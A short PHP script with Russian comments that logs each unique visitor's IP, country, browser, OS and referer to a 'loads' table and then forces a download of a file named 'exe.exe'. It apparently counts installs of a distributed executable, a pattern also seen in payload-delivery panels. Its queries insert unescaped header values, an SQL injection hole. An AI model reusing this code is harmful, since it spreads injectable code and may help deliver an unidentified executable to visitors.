<?php

include_once("config.php");
include_once("geoip.php");
include_once("functions.php");

function load()
{
	GLOBAL $exe, $mysql;
	mysql_connect($mysql['host'], $mysql['user'], $mysql['password']) or die("Немогу подкл. к серверу мускула!");
	mysql_select_db($mysql['db']) or die("БД ".$mysql['db']." не найдена!");

	//Добавляем загрузки (уникальные ip)
	if (mysql_num_rows(mysql_query("SELECT * FROM loads WHERE ip = '"._ip()."'"))==0)
	{
		mysql_query("INSERT into loads VALUES('"._ip()."', '"._country(_ip())."', '"._browser()."','"._os()."','"._referer()."')");
	}
     //send file
           header("Pragma: public");
           header('Expires: '.gmdate('D, d M Y H:i:s').' GMT');
           header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
           header("Cache-Control: private",false);
           header("Content-Type: application/x-msdownload");
           header('Content-Disposition: attachment; filename="exe.exe"');
           header("Content-Transfer-Encoding: binary");
           header('Content-Length: '.filesize($exe));
           @set_time_limit(0);
           @readfile($exe);
}
load();
?>